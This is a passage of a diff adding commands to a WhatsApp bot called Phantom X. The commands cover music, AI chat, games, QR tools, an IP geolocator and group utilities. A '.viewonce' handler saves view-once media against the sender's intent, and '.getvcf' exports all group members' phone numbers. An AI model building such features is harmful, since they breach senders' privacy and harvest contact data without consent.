+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                if (!quoted) return reply("👁️ Reply to a view-once message with *.viewonce* to reveal it.");
+                const voMsg = quoted?.viewOnceMessage?.message || quoted?.viewOnceMessageV2?.message || quoted;
+                const voType = getContentType(voMsg);
+                try {
+                    const fakeMsg = { ...msg, message: voMsg };
+                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    if (!buf || buf.length === 0) return reply("❌ Could not download media — the message may have expired.");
+                    const ownerJid = (sock.user?.id || "").split(':')[0].split('@')[0] + "@s.whatsapp.net";
+                    if (voType === "imageMessage") {
+                        await sock.sendMessage(ownerJid, { image: buf, caption: `👁️ *View-once revealed*\n_Saved by Phantom X_` });
+                        await reply("✅ View-once image sent to your private chat!");
+                    } else if (voType === "videoMessage") {
+                        await sock.sendMessage(ownerJid, { video: buf, caption: `👁️ *View-once revealed*\n_Saved by Phantom X_` });
+                        await reply("✅ View-once video sent to your private chat!");
+                    } else {
+                        await reply("❌ Unsupported view-once type.");
+                    }
+                } catch (e) { await reply(`❌ Failed to reveal: ${e?.message}`); }
+                break;
+            }
+
+            // --- SONG SEARCH ---
+            case ".song": {
+                const query = parts.slice(1).join(" ").trim();
+                if (!query) return reply("Usage: .song <title> [artist]\nExample: .song Blinding Lights The Weeknd");
+                await reply(`🎵 Searching for *${query}*...`);
+                try {
+                    const results = await searchSongs(query);
+                    if (!results.length) return reply(`❌ No songs found for *${query}*.`);
+                    let text = `🎵 *Search results for "${query}":*\n━━━━━━━━━━━━━━━━━━━\n`;
+                    for (const s of results) {
+                        const mins = Math.floor(s.trackTimeMillis / 60000);
+                        const secs = String(Math.floor((s.trackTimeMillis % 60000) / 1000)).padStart(2, "0");
+                        text += `\n🎧 *${s.trackName}*\n👤 ${s.artistName}\n💿 ${s.collectionName}\n⏱️ ${mins}:${secs}\n`;
+                        if (s.previewUrl) text += `🔊 Preview: ${s.previewUrl}\n`;
+                        text += `─────────────────\n`;
+                    }
+                    text += `\n_Use .lyrics <artist> | <title> to get lyrics_`;
+                    await reply(text);
+                } catch (e) { await reply(`❌ Song search failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- LYRICS ---
+            case ".lyrics": {
+                const lyricsInput = parts.slice(1).join(" ").trim();
+                if (!lyricsInput.includes("|")) return reply("Usage: .lyrics <artist> | <song title>\nExample: .lyrics Burna Boy | Last Last");
+                const [artist, title] = lyricsInput.split("|").map(s => s.trim());
+                if (!artist || !title) return reply("Usage: .lyrics <artist> | <song title>");
+                await reply(`🎤 Fetching lyrics for *${title}* by *${artist}*...`);
+                try {
+                    const lyrics = await getLyrics(artist, title);
+                    if (!lyrics) return reply(`❌ Lyrics not found for *${title}* by *${artist}*.`);
+                    const header = `🎤 *${title.toUpperCase()}*\n👤 ${artist}\n━━━━━━━━━━━━━━━━━━━\n\n`;
+                    const fullText = header + lyrics;
+                    // Split if too long (WhatsApp limit ~65000 chars)
+                    if (fullText.length > 4000) {
+                        await reply(fullText.slice(0, 4000) + "\n\n_(continued...)_");
+                        if (fullText.length > 4000) await reply(fullText.slice(4000, 8000));
+                    } else {
+                        await reply(fullText);
+                    }
+                } catch (e) { await reply(`❌ Lyrics fetch failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- IMAGE GENERATION (Pollinations.ai - free, no API key) ---
+            case ".imagine": {
+                const rawPrompt = parts.slice(1).join(" ").trim();
+                if (!rawPrompt) return reply(
+                    `🎨 *Image Generator*\n\n` +
+                    `Usage: *.imagine <description>*\n\n` +
+                    `Examples:\n` +
+                    `• _.imagine a lion wearing a crown at sunset_\n` +
+                    `• _.imagine futuristic Lagos city at night_\n` +
+                    `• _.imagine a rose made of ice_\n\n` +
+                    `_Tip: The more specific your description, the better the image._`
+                );
+                const GEMINI_KEY = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
+                let finalPrompt = rawPrompt;
+                if (GEMINI_KEY) {
+                    try {
+                        const gemBody = JSON.stringify({ contents: [{ parts: [{ text:
+                            `You are an AI image prompt expert. The user wants to generate an image with this description: "${rawPrompt}"\n\n` +
+                            `Rule 1 — If the description is clear and specific enough to generate an image (including medical, anatomical, scientific, realistic, or any other subject), respond with ONLY an improved, vivid, highly detailed image generation prompt (1-2 sentences). Be specific about lighting, style, and composition. Do not add any explanation or restrictions.\n\n` +
+                            `Rule 2 — If the description is genuinely ambiguous and could mean very different images (e.g. "bride of barbados" could be a person, a flower, or something from Barbados), respond EXACTLY in this format:\n` +
+                            `CLARIFY: <a short specific question to ask the user>\n\n` +
+                            `Do NOT add anything else. Just the improved prompt or the CLARIFY line.`
+                        }] }] });
+                        const gemRes = await new Promise((resolve, reject) => {
+                            const req = https.request({
+                                hostname: "generativelanguage.googleapis.com",
+                                path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`,
+                                method: "POST",
+                                headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(gemBody) },
+                            }, res => { let d = ""; res.on("data", c => d += c); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { reject(); } }); });
+                            req.on("error", reject); req.write(gemBody); req.end();
+                        });
+                        const gemText = gemRes?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
+                        if (gemText?.startsWith("CLARIFY:")) {
+                            const question = gemText.replace("CLARIFY:", "").trim();
+                            return reply(
+                                `🎨 *Image Generator*\n\n` +
+                                `Before I generate, I want to make sure I get this right:\n\n` +
+                                `❓ _${question}_\n\n` +
+                                `Reply with *.imagine <your clarification>* to continue.`
+                            );
+                        }
+                        if (gemText) finalPrompt = gemText;
+                    } catch (_) {}
+                }
+                await reply(`🎨 Generating your image...\n_"${rawPrompt}"_\n⏳ Please wait...`);
+                try {
+                    const imgUrl = buildImageGenUrl(finalPrompt);
+                    const buf = await fetchBuffer(imgUrl);
+                    await sock.sendMessage(from, { image: buf, caption: `🎨 *Generated Image*\n_${rawPrompt}_` }, { quoted: msg });
+                } catch (e) {
+                    try {
+                        const fallbackUrl = buildImageGenUrl(rawPrompt);
+                        const buf = await fetchBuffer(fallbackUrl);
+                        await sock.sendMessage(from, { image: buf, caption: `🎨 *Generated Image*\n_${rawPrompt}_` }, { quoted: msg });
+                    } catch (fallbackErr) {
+                        await reply(`❌ Image generation failed: ${fallbackErr?.message || e?.message || "error"}`);
+                    }
+                }
+                break;
+            }
+
+            // --- SCREENSHOT ---
+            case ".ss":
+            case ".screenshot": {
+                const url = parts[1];
+                if (!url) return reply("Usage: .ss <url>\nExample: .ss google.com");
+                await reply(`📸 Taking screenshot of *${url}*...`);
+                try {
+                    const ssUrl = buildScreenshotUrl(url);
+                    const buf = await fetchBuffer(ssUrl);
+                    await sock.sendMessage(from, { image: buf, caption: `📸 Screenshot of ${url}` }, { quoted: msg });
+                } catch (e) { await reply(`❌ Screenshot failed: ${e?.message}`); }
+                break;
+            }
+
+            // --- AI CHAT (Google Gemini) ---
+            case ".ai":
+            case ".ask":
+            case ".gemini": {
+                const question = parts.slice(1).join(" ").trim();
+                if (!question) return reply("Usage: .ai <your question>\nExample: .ai What is the capital of Nigeria?");
+                await reply("🤖 _Processing..._");
+                try {
+                    const aiReply = await callAI(question);
+                    await reply(`🤖 *Phantom AI:*\n\n${aiReply}`);
+                } catch (e) {
+                    await reply(`❌ *AI error:* ${e?.message || "Unknown error"}`);
+                }
+                break;
+            }
+
+            // --- QUESTION SOLVER (image or text, all subjects) ---
+            case ".solve":
+            case ".answer": {
+                const GEMINI_KEY = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedType = quoted ? getContentType(quoted) : null;
+                const cmdText = parts.slice(1).join(" ").trim();
+                let questionText = cmdText;
+                let imageBase64 = null;
+                let imageMimeType = "image/jpeg";
+                if (quoted) {
+                    if (quotedType === "imageMessage") {
+                        await reply("🔍 *Analyzing image...*\n⏳ Solving your question, please wait...");
+                        try {
+                            const fakeMsg = { ...msg, message: quoted };
+                            const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                            imageBase64 = buf.toString("base64");
+                            imageMimeType = quoted.imageMessage?.mimetype || "image/jpeg";
+                        } catch (e) { return reply(`❌ Failed to read image: ${e?.message}`); }
+                    } else {
+                        const quotedTxt = quoted?.conversation || quoted?.extendedTextMessage?.text || "";
+                        if (quotedTxt && !questionText) questionText = quotedTxt;
+                    }
+                }
+                if (!imageBase64 && !questionText) {
+                    return reply(
+                        `🧠 *Question Solver*\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                        `Solve questions from images or text using AI.\n\n` +
+                        `*How to use:*\n` +
+                        `1️⃣ Reply to a *photo of a question* with *.solve*\n` +
+                        `2️⃣ Reply to a *text question* with *.solve*\n` +
+                        `3️⃣ Type *.solve <your question>* directly\n\n` +
+                        `*Subjects covered:*\n` +
+                        `Math • Biology • Physics • Chemistry\n` +
+                        `Government • Economics • English • Geography\n` +
+                        `History • Literature • and more\n\n` +
+                        `_If the image is unclear, the bot will ask for clarification._`
+                    );
+                }
+                const solveSystem =
+                    `You are an expert academic tutor. Solve the question provided thoroughly and clearly.\n` +
+                    `- Show step-by-step working where applicable.\n` +
+                    `- Cover any subject: Math, Biology, Physics, Chemistry, Economics, Government, English, Geography, History, Literature, etc.\n` +
+                    `- If it's from an image, extract the full question and solve it completely.\n` +
+                    `- If part of the image is unclear, state what you can see and ask ONE specific clarifying question.\n` +
+                    `- Format your answer clearly using numbered steps where needed.`;
+                try {
+                    if (imageBase64) {
+                        // Image solve requires Gemini multimodal — fall back to text extraction if no key
+                        if (!GEMINI_KEY) return reply("⚠️ *Image solving needs a Gemini API key.*\nFor text questions, just type *.solve <your question>* — that works without any key.");
+                        const contents = [{ parts: [
+                            { text: solveSystem + (questionText ? `\n\nExtra context: ${questionText}` : "\n\nSolve the question in this image.") },
+                            { inline_data: { mime_type: imageMimeType, data: imageBase64 } }
+                        ]}];
+                        const reqBody = JSON.stringify({ contents });
+                        const answer = await new Promise((resolve, reject) => {
+                            const req = https.request({
+                                hostname: "generativelanguage.googleapis.com",
+                                path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`,
+                                method: "POST",
+                                headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(reqBody) },
+                            }, (res) => {
+                                let data = "";
+                                res.on("data", c => data += c);
+                                res.on("end", () => {
+                                    try {
+                                        const parsed = JSON.parse(data);
+                                        resolve(parsed?.candidates?.[0]?.content?.parts?.[0]?.text || "No response received.");
+                                    } catch { reject(new Error("Parse error")); }
+                                });
+                            });
+                            req.on("error", reject);
+                            req.write(reqBody);
+                            req.end();
+                        });
+                        await sock.sendMessage(from, { text: `🧠 *Question Solver*\n━━━━━━━━━━━━━━━━━━━━\n\n${answer}` }, { quoted: msg });
+                    } else {
+                        // Text solve — uses full AI fallback chain (no key needed)
+                        await reply("🧠 *Solving your question...*\n⏳ Please wait...");
+                        const answer = await callAI(`Question: ${questionText}`, { system: solveSystem });
+                        await sock.sendMessage(from, { text: `🧠 *Question Solver*\n━━━━━━━━━━━━━━━━━━━━\n\n${answer}` }, { quoted: msg });
+                    }
+                } catch (e) { await reply(`❌ Solve failed: ${e?.message || "Unknown error"}`); }
+                break;
+            }
+
+            // --- TIC-TAC-TOE ---
+            case ".ttt": {
+                const sub = parts[1]?.toLowerCase();
+                if (sub === "stop" || sub === "end") {
+                    delete gameState[from];
+                    return reply("🛑 Tic-Tac-Toe game ended.");
+                }
+
+                if (gameState[from]) return reply("⚠️ A game is already active. Use *.ttt stop* to end it.");
+
+                const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                
+                // If they didn't tag anyone, start a game against the bot (AI)!
+                if (mentioned.length === 0) {
+                    gameState[from] = {
+                        type: "ttt",
+                        board: Array(9).fill(""),
+                        players: [senderJid, "BOT"], // Player 1 is user, Player 2 is BOT
+                        turn: 0,
+                    };
+                    await sock.sendMessage(from, {
+                        text: `❌⭕ *Tic-Tac-Toe vs Bot Started!*\n\n` +
+                              `❌ You vs ⭕ Phantom-X\n\n` +
+                              `${renderTTTBoard(gameState[from].board)}\n\n` +
+                              `👉 Your turn! Send a number *1-9* to make your move.`,
+                        mentions: [senderJid]
+                    }, { quoted: msg });
+                    return;
+                }
+
+                if (!isGroup) return reply("⚠️ PvP Tic-Tac-Toe requires you to be in a group, or don't tag anyone to play against me!");
+                
+                if (mentioned.length < 2) return reply("Usage:\n*.ttt* — Play against me\n*.ttt @player1 @player2* — Play against a friend in a group");
+                
+                gameState[from] = {
+                    type: "ttt",
+                    board: Array(9).fill(""),
+                    players: [mentioned[0], mentioned[1]],
+                    turn: 0,
+                };
+                await sock.sendMessage(from, {
+                    text: `❌⭕ *Tic-Tac-Toe Started!*\n\n` +
+                          `❌ @${mentioned[0].split("@")[0]} vs ⭕ @${mentioned[1].split("@")[0]}\n\n` +
+                          `${renderTTTBoard(gameState[from].board)}\n\n` +
+                          `👉 @${mentioned[0].split("@")[0]} goes first! Send a number *1-9* to make your move.`,
+                    mentions: [mentioned[0], mentioned[1]],
+                }, { quoted: msg });
+                break;
+            }
+
+            // --- TRUTH OR DARE ---
+            case ".truth": {
+                const truth = TRUTHS[Math.floor(Math.random() * TRUTHS.length)];
+                await reply(`🤔 *TRUTH:*\n\n_${truth}_`);
+                break;
+            }
+
+            case ".dare": {
+                const dare = DARES[Math.floor(Math.random() * DARES.length)];
+                await reply(`😈 *DARE:*\n\n_${dare}_`);
+                break;
+            }
+
+            // --- WORD CHAIN ---
+            case ".wordchain": {
+                if (!isGroup) return reply("Word Chain only works in groups.");
+                const sub = parts[1]?.toLowerCase();
+                if (sub === "stop" || sub === "end") {
+                    delete gameState[from];
+                    return reply("🛑 Word Chain game ended.");
+                }
+                if (gameState[from]) return reply("⚠️ A game is already active. Use *.wordchain stop* to end it first.");
+                const startWord = parts[1] || "PHANTOM";
+                const word = startWord.toLowerCase().replace(/[^a-z]/g, "");
+                gameState[from] = { type: "wordchain", lastWord: word, usedWords: [word], lastPlayer: null };
+                const nextLetter = word.slice(-1).toUpperCase();
+                await reply(
+                    `🔤 *Word Chain Started!*\n\n` +
+                    `First word: *${word.toUpperCase()}*\n\n` +
+                    `Next word must start with *${nextLetter}*\n` +
+                    `Rules: No repeating words! Use *.wordchain stop* to end.`
+                );
+                break;
+            }
+
+            // --- GROUP RAW SEND TEST ---
+            case ".groupraw":
+            case ".grouptest": {
+                const rawMsg = parts.slice(1).join(" ").trim() || "✅ Phantom-X raw group send test";
+                const rawSend = sock.__originalSendMessage || sock.sendMessage.bind(sock);
+                try {
+                    let targetJid = from;
+                    let targetName = isGroup ? (groupNames[from] || from) : null;
+
+                    if (!isGroup) {
+                        const groups = await sock.groupFetchAllParticipating();
+                        const picks = Object.values(groups || {}).filter(g => !g.announce && !g.isCommunity && !g.isCommunityAnnounce);
+                        if (!picks.length) return reply("❌ No open groups found to test. Add the bot to a normal unlocked group first.");
+                        targetJid = picks[0].id;
+                        targetName = picks[0].subject || targetJid;
+                    }
+
+                    await ensureGroupReady(sock, targetJid, 'cmd.groupraw');
+                    await rawSend(targetJid, { text: rawMsg });
+                    if (isGroup) {
+                        await reply(`✅ Raw plain-text group send succeeded here.`);
+                    } else {
+                        await reply(`✅ Raw plain-text group send succeeded in: *${targetName}*
+
+JID: \`${targetJid}\``);
+                    }
+                } catch (e) {
+                    await reply(`❌ Raw group send failed: ${e?.message || e}`);
+                }
+                break;
+            }
+
+            // --- PING ---
+            case ".ping": {
+                const start = Date.now();
+                await sock.sendMessage(from, { text: "⚡ _scanning signal..._" }, { quoted: msg });
+                const latency = Date.now() - start;
+                await reply(buildOmegaTerminal(
+                    `            — *S I G N A L* —\n\n` +
+                    `   ⚡ *LATENCY* ──╼  [ ${latency}ms ]\n` +
+                    `   📡 *RESONANCE* ──╼  [ ${latency < 300 ? "STABLE" : latency < 800 ? "MODERATE" : "DEGRADED"} ]\n` +
+                    `   ⏱️ *UPTIME* ──╼  [ ${formatUptime()} ]\n\n` +
+                    `   " *An echo in the void is*\n     *the only proof you exist* ."`
+                ));
+                break;
+            }
+
+            case ".testbutton": {
+                await reply('Use *.btntest* to run the full button/list matrix test.');
+                break;
+            }
+
+            // --- T09 utilities ---
+            case ".uptime": {
+                const mu = process.memoryUsage();
+                const heapU = (mu.heapUsed / 1024 / 1024).toFixed(0);
+                const heapT = (mu.heapTotal / 1024 / 1024).toFixed(0);
+                const rss   = (mu.rss / 1024 / 1024).toFixed(0);
+                await reply(buildOmegaTerminal(
+                    `   ┌── *TEMPORAL LOGS* ──┐\n` +
+                    `   ╿\n` +
+                    `   ┝  *ACTIVE* : ${formatUptime()}\n` +
+                    `   ┝  *HEAP* : ${heapU}MB / ${heapT}MB\n` +
+                    `   ┝  *RSS* : ${rss}MB\n` +
+                    `   ┝  *PID* : ${process.pid}\n` +
+                    `   ╿\n` +
+                    `   └── *STABILITY: OPERATIONAL* ──┘\n\n` +
+                    `   " *I have survived the collapse.*\n     *My pulse keeps this realm*\n     *from drifting into the void.* "`
+                ));
+                break;
+            }
+
+            case ".linkedlist": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Owner/dev only.");
+                try {
+                    const sessions = JSON.parse(fs.readFileSync("sessions.json", "utf8"));
+                    const list = Object.keys(sessions);
+                    if (!list.length) return reply("📭 No linked numbers right now.");
+                    let out = `🔗 *Linked Numbers (${list.length})*\n━━━━━━━━━━━━━━\n`;
+                    list.forEach((j, i) => { out += `${i + 1}. ${j.split("@")[0]}\n`; });
+                    await reply(out);
+                } catch { await reply("📭 No sessions file yet."); }
+                break;
+            }
+
+            case ".slowmode": {
+                if (!isGroup) return reply("Groups only.");
+                const r = await getGroupRoles(sock, from);
+                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
+                const sub = parts[1]?.toLowerCase();
+                if (sub === "off") { setGroupSetting(from, "slowmode_seconds", 0); return reply("⏱️ Slowmode *OFF*."); }
+                const secs = parseInt(sub, 10);
+                if (!secs || secs < 1 || secs > 3600) return reply("Usage: .slowmode <seconds>  |  .slowmode off\nExample: .slowmode 15");
+                setGroupSetting(from, "slowmode_seconds", secs);
+                await reply(`⏱️ Slowmode set to *${secs}s* per user.`);
+                break;
+            }
+
+            case ".warnings": {
+                if (!isGroup) return reply("Groups only.");
+                const target = resolveTargetJid(msg, parts) || senderJid;
+                let warns = {};
+                try { warns = JSON.parse(fs.readFileSync("warns.json", "utf8")); } catch {}
+                const count = warns?.[from]?.[target] || 0;
+                await reply(`⚠️ @${target.split("@")[0]} has *${count}/3* warnings.`, { mentions: [target] });
+                break;
+            }
+
+            case ".shorten": {
+                const url = parts[1];
+                if (!url || !/^https?:\/\//i.test(url)) return reply("Usage: .shorten <url>");
+                try {
+                    const short = await new Promise((res, rej) => {
+                        https.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`,
+                            r => { let d = ""; r.on("data", c => d += c); r.on("end", () => res(d.trim())); }
+                        ).on("error", rej);
+                    });
+                    if (short && short.startsWith("http")) await reply(`🔗 *Shortened:*\n${short}`);
+                    else await reply(`❌ Could not shorten. (${short})`);
+                } catch (e) { await reply("❌ Shorten service unreachable."); }
+                break;
+            }
+
+            case ".expand": {
+                const url = parts[1];
+                if (!url || !/^https?:\/\//i.test(url)) return reply("Usage: .expand <short-url>");
+                try {
+                    const final = await new Promise((res, rej) => {
+                        const u = new URL(url);
+                        const mod = u.protocol === "https:" ? https : http;
+                        const req = mod.request({ method: "HEAD", host: u.hostname, path: u.pathname + u.search }, r => {
+                            res(r.headers.location || url);
+                        });
+                        req.on("error", rej); req.end();
+                    });
+                    await reply(`🔍 *Resolves to:*\n${final}`);
+                } catch { await reply("❌ Could not resolve."); }
+                break;
+            }
+
+            case ".qrtext": {
+                const text = parts.slice(1).join(" ");
+                if (!text) return reply("Usage: .qrtext <text or url>");
+                try {
+                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(text)}`;
+                    const buf = await fetchBuffer(qrUrl);
+                    await sock.sendMessage(from, { image: buf, caption: `📲 *QR for:* ${text}` }, { quoted: msg });
+                } catch { await reply("❌ QR generator unreachable."); }
+                break;
+            }
+
+            case ".scanqr": {
+                const ctx = msg.message?.extendedTextMessage?.contextInfo;
+                const quoted = ctx?.quotedMessage;
+                const imgMsg = quoted?.imageMessage || msg.message?.imageMessage;
+                if (!imgMsg) return reply("Reply to an image of a QR code with .scanqr");
+                try {
+                    const stream = await downloadContentFromMessage(imgMsg, "image");
+                    let buf = Buffer.from([]);
+                    for await (const ch of stream) buf = Buffer.concat([buf, ch]);
+                    const tmp = `/tmp/qr_${Date.now()}.jpg`;
+                    fs.writeFileSync(tmp, buf);
+                    const result = await new Promise((res, rej) => {
+                        const form = `--bnd\r\nContent-Disposition: form-data; name="file"; filename="qr.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`;
+                        const tail = `\r\n--bnd--\r\n`;
+                        const body = Buffer.concat([Buffer.from(form), buf, Buffer.from(tail)]);
+                        const req = https.request({
+                            host: "api.qrserver.com", path: "/v1/read-qr-code/", method: "POST",
+                            headers: { "Content-Type": "multipart/form-data; boundary=bnd", "Content-Length": body.length }
+                        }, r => { let d = ""; r.on("data", c => d += c); r.on("end", () => res(d)); });
+                        req.on("error", rej); req.write(body); req.end();
+                    });
+                    fs.unlinkSync(tmp);
+                    const parsed = JSON.parse(result);
+                    const data = parsed?.[0]?.symbol?.[0]?.data;
+                    if (data) await reply(`📲 *QR contents:*\n${data}`);
+                    else await reply(`❌ Could not read QR (${parsed?.[0]?.symbol?.[0]?.error || "unknown"}).`);
+                } catch (e) { await reply(`❌ Scan failed: ${e.message}`); }
+                break;
+            }
+
+            case ".getvcf": {
+                if (!isGroup) return reply("Groups only.");
+                const r = await getGroupRoles(sock, from);
+                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
+                try {
+                    const meta = r.meta || await sock.groupMetadata(from);
+                    let vcf = "";
+                    meta.participants.forEach((p, i) => {
+                        const num = p.id.split("@")[0];
+                        vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${meta.subject} ${i + 1}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD\n`;
+                    });
+                    const path = `/tmp/${meta.subject.replace(/\W+/g, "_")}.vcf`;
+                    fs.writeFileSync(path, vcf);
+                    await sock.sendMessage(from, {
+                        document: fs.readFileSync(path),
+                        mimetype: "text/x-vcard",
+                        fileName: `${meta.subject}.vcf`
+                    }, { quoted: msg });
+                    fs.unlinkSync(path);
+                } catch (e) { await reply(`❌ ${e.message}`); }
+                break;
+            }
+
+            // --- T10: AFK ---
+            case ".afk": {
+                const reason = parts.slice(1).join(" ").trim() || "AFK";
+                setAfk(senderJid, reason);
+                await reply(`💤 @${senderJid.split("@")[0]} is now AFK.\nReason: ${reason}`, { mentions: [senderJid] });
+                break;
+            }
+            case ".unafk":
+            case ".back": {
+                if (!getAfk(senderJid)) return reply("You're not marked AFK.");
+                clearAfk(senderJid);
+                await reply(`👋 Welcome back @${senderJid.split("@")[0]}!`, { mentions: [senderJid] });
+                break;
+            }
+
+            // --- T11: profile / rank ---
+            case ".profile": {
+                if (!isGroup) return reply("Groups only.");
+                const target = resolveTargetJid(msg, parts) || senderJid;
+                const stats = loadStats()?.[from] || {};
+                const myCount = stats[target] || 0;
+                const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1]);
+                const rankIdx = sorted.findIndex(([j]) => j === target);
+                const rank = rankIdx >= 0 ? rankIdx + 1 : "—";
+                const total = sorted.length;
+                const a = getAfk(target);
+                let pp = null;
+                try { pp = await sock.profilePictureUrl(target, "image"); } catch {}
+                const txt =
+                    `👤 *Profile*\n━━━━━━━━━━━━\n` +
+                    `Name: @${target.split("@")[0]}\n` +
+                    `Messages here: *${myCount}*\n` +
+                    `Rank in group: *${rank}/${total}*\n` +
+                    `Status: ${a ? `💤 AFK — ${a.reason}` : "🟢 Active"}`;
+                if (pp) {
+                    try {
+                        const buf = await fetchBuffer(pp);
+                        return await sock.sendMessage(from, { image: buf, caption: txt, mentions: [target] }, { quoted: msg });
+                    } catch {}
+                }
+                await reply(txt, { mentions: [target] });
+                break;
+            }
+
+            case ".rank":
+            case ".leaderboard": {
+                if (!isGroup) return reply("Groups only.");
+                const stats = loadStats()?.[from] || {};
+                const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1]).slice(0, 10);
+                if (!sorted.length) return reply("📊 No stats yet for this group.");
+                let out = `🏆 *Top 10 Active Members*\n━━━━━━━━━━━━━━\n`;
+                const mentions = [];
+                sorted.forEach(([j, c], i) => {
+                    out += `${i + 1}. @${j.split("@")[0]} — ${c} msgs\n`;
+                    mentions.push(j);
+                });
+                await reply(out, { mentions });
+                break;
+            }
+
+            case ".itrace": case ".geolocate": {
+                const ip = parts[1];
+                if (!ip) return reply("Usage: .itrace <ip-or-domain>");
+                try {
+                    const data = await fetchJSON(`https://ipwho.is/${encodeURIComponent(ip)}`);
+                    if (!data.success) return reply(`❌ ${data.message || "Lookup failed"}`);
+                    await reply(
+                        `🌍 *IP Trace*\n━━━━━━━━━━\n` +
+                        `IP: ${data.ip}\n` +
+                        `Country: ${data.country} ${data.country_code}\n` +
+                        `Region: ${data.region}\n` +
+                        `City: ${data.city}\n` +
+                        `ISP: ${data.connection?.isp || "?"}\n` +
+                        `Lat/Lng: ${data.latitude}, ${data.longitude}\n` +
+                        `Timezone: ${data.timezone?.id || "?"}`
+                    );
+                } catch (e) { await reply(`❌ ${e.message}`); }
+                break;
+            }
+
+            // --- CALCULATOR ---
+            case ".calc": {
+                const expr = parts.slice(1).join("").replace(/[^0-9+\-*/.%()\s]/g, "");
+                if (!expr) return reply("Usage: .calc 5 * 3 + 2");
+                try { await reply(`🧮 *${expr} = ${eval(expr)}*`); } catch { await reply("❌ Invalid expression."); }
+                break;
+            }
+
+            // --- COIN FLIP ---
+            case ".flip": {
+                await reply(`🪙 *${Math.random() < 0.5 ? "HEADS" : "TAILS"}!*`);
+                break;
+            }
+
+            // --- DICE ---
+            case ".dice": {
+                const sides = parseInt(parts[1]) || 6;
+                const roll = Math.floor(Math.random() * sides) + 1;
+                await reply(`🎲 Rolled a *${sides}-sided die*: *${roll}!*`);
+                break;
+            }
+
+            // --- MAGIC 8-BALL ---
+            case ".8ball": {
+                const q = parts.slice(1).join(" ").trim();
+                if (!q) return reply("Usage: .8ball Will I win today?");
+                const ans = EIGHTBALL[Math.floor(Math.random() * EIGHTBALL.length)];
+                await reply(`🎱 *Question:* _${q}_\n\n🎱 *Answer:* ${ans}`);
+                break;
+            }
+
+            // --- ROCK PAPER SCISSORS ---
+            case ".rps": {
+                const choices = { rock: "🪨", paper: "📄", scissors: "✂️" };
+                const wins = { rock: "scissors", paper: "rock", scissors: "paper" };
+                const user = parts[1]?.toLowerCase();
+                if (!choices[user]) return reply("Usage: .rps rock/paper/scissors");
+                const bot = Object.keys(choices)[Math.floor(Math.random() * 3)];
+                let result = user === bot ? "🤝 It's a *draw*!" : wins[user] === bot ? "🎉 You *win*!" : "😈 You *lose*!";
+                await reply(`✊ *Rock Paper Scissors!*\n\nYou: ${choices[user]} *${user}*\nMe: ${choices[bot]} *${bot}*\n\n${result}`);
+                break;
+            }
+
+            // --- SLOTS ---
+            case ".slots": {
+                const sym = ["🍒","🍋","🍊","🍇","⭐","💎","🔔"];
+                const r = [sym[Math.floor(Math.random()*7)], sym[Math.floor(Math.random()*7)], sym[Math.floor(Math.random()*7)]];
+                const won = r[0]===r[1] && r[1]===r[2];
+                await reply(`🎰 *SLOTS!*\n\n┌─────────────┐\n│  ${r[0]}  │  ${r[1]}  │  ${r[2]}  │\n└─────────────┘\n\n${won ? "🎉 *JACKPOT! You win!* 💰" : r[0]===r[1]||r[1]===r[2]||r[0]===r[2] ? "✨ *Two of a kind!* Almost there..." : "❌ No match. Try again!"}`);
+                break;
+            }
+
+            // --- TRIVIA ---
+            case ".trivia": {
+                if (triviaState[from]) {
+                    const t = triviaState[from];
+                    const guess = parts.slice(1).join(" ").trim().toLowerCase();
+                    if (!guess) return reply(`❓ *Question:* _${t.q}_\n\n💡 Hint: ${t.hint}\n\nType *.trivia <answer>* to answer!`);
+                    if (guess === t.a) {
+                        delete triviaState[from];
+                        return reply(`✅ *CORRECT!* 🎉\n\nThe answer was: *${t.a}*`);
+                    } else {
+                        return reply(`❌ Wrong! Try again or type *.trivia skip* to skip.`);
+                    }
+                }
+                if (parts[1]?.toLowerCase() === "skip") { delete triviaState[from]; return reply("⏭️ Question skipped!"); }
+                const tq = TRIVIA_QUESTIONS[Math.floor(Math.random() * TRIVIA_QUESTIONS.length)];
+                triviaState[from] = tq;
+                await reply(`🧠 *TRIVIA TIME!*\n\n❓ *${tq.q}*\n\n💡 Hint: ${tq.hint}\n\nType *.trivia <your answer>*`);
+                break;
+            }
+
+            // --- HANGMAN ---
+            case ".hangman": {
